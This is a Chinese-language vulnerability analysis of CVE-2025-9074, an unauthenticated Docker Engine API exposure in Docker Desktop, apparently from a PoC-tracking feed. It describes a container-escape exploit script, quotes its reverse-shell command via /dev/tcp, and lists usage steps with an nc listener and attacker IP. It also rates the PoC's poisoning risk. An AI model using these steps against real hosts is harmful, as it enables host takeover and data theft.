## CVE-2025-9074 - Docker Desktop 远程代码执行 (RCE) / 未授权API访问

**漏洞编号:** CVE-2025-9074

**漏洞类型:** 远程代码执行 (RCE) / 未授权API访问

**影响应用:** Docker Desktop

**危害等级:** 高风险

**CVSS评分:** 未明确提供，但readme中描述为'critical'和'High Risk'

**影响版本:** 未指定

**利用条件:** 无需认证，需要网络访问Docker Engine API (默认2375端口)

**POC 可用性:** 9

**POC 类型:** 完整利用

**攻击复杂度:** 低

**投毒风险:** 10%

## 详情

CVE-2025-9074是一个影响Docker Desktop的严重漏洞，允许本地运行的Linux容器通过默认子网（192.168.65.7:2375）连接到Docker Engine API，从而实现未经授权的远程代码执行（RCE）。即使启用了增强容器隔离（ECI）或TCP暴露设置，此问题依然存在。该漏洞可能导致未经授权访问宿主机上的用户文件，因此被评估为高风险。

**POC有效性分析**
提供的POC是一个名为`exploit.sh`的Bash脚本，它是一个功能完整的Docker API未授权RCE漏洞利用工具。该脚本通过直接与Docker Engine API交互，自动化了容器逃逸过程，实现了远程代码执行。它首先尝试获取目标Docker守护进程上的可用镜像（如`alpine`），然后创建一个特权容器。此容器被配置为挂载宿主机的根目录（`/`）到容器内的`/host`，并以`privileged`模式和`host`网络模式运行。最关键的是，该容器的启动命令被设置为`chroot /host /bin/sh -c 'sh -i >& /dev/tcp/$LHOST/$LPORT 0>&1'`，这将在宿主机的文件系统上下文中执行命令，并建立一个反向shell到攻击者指定的监听地址和端口。脚本逻辑清晰，使用了标准的`curl`和`grep`工具，无需额外依赖。由于其直接利用Docker API的特性和对容器配置的精准控制，该POC在技术上非常可靠和有效，能够成功实现RCE。

**利用步骤**
1. 攻击者需首先启动一个监听器，例如使用Netcat工具：`nc -lvp <LPORT>`。
2. 接着，执行提供的`exploit.sh`脚本，指定目标Docker主机的IP地址和端口（默认为192.168.65.7:2375），以及攻击者监听器的IP地址和端口。例如：`./exploit.sh <TARGET_IP> <TARGET_PORT> -l <ATTACKER_IP> -p <LPORT>`。
3. 脚本将自动执行以下操作：探测目标Docker守护进程上的可用镜像；创建一个新的Docker容器，该容器具有特权模式、主机网络模式，并挂载宿主机的根文件系统；启动该容器，执行预设的命令，该命令通过`chroot`在宿主机环境中弹出一个反向shell到攻击者的监听器。
4. 一旦反向shell建立成功，攻击者将获得宿主机的shell访问权限，从而可以执行任意命令、访问文件等。

**投毒风险分析**
提供的POC代码`exploit.sh`是一个清晰、直接的Bash脚本，旨在演示和利用CVE-2025-9074漏洞。代码中没有发现明显的混淆、加密、引入外部恶意库或执行与漏洞利用本身无关的恶意行为。它仅依赖于`curl`和`grep`等标准Linux工具，这些工具的行为是可预测且透明的。脚本的核心功能是与Docker API交互以创建和启动一个具有特定配置的容器，并通过该容器在宿主机上建立一个反向shell。这个反向shell是漏洞利用成功的表现，而非POC本身携带的恶意载荷。务必注意，此处的“后门代码”指的是通过漏洞成功利用后建立的控制通道，而不是POC脚本本身被恶意修改以植入的后门。因此，POC脚本本身并未被“投毒”。在分析过程中，我们特别留意了任何可能隐藏恶意payload、下载未知二进制文件、修改系统关键配置或尝试建立持久性后门的迹象，但均未发现。代码结构简单，易于审计，所有命令都直接可见。因此，该POC的投毒风险极低。建议用户在运行任何来自外部来源的POC代码时，仍应仔细审查其内容，以防范潜在的修改或隐藏的恶意功能，但在当前提供的代码中，没有发现这些迹象。鉴于代码的透明性和其明确的漏洞利用目的，其投毒风险可以评估为低，大约在10%左右。

**项目地址:** 未提供

**漏洞详情:** https://nvd.nist.gov/vuln/detail/CVE-2025-9074
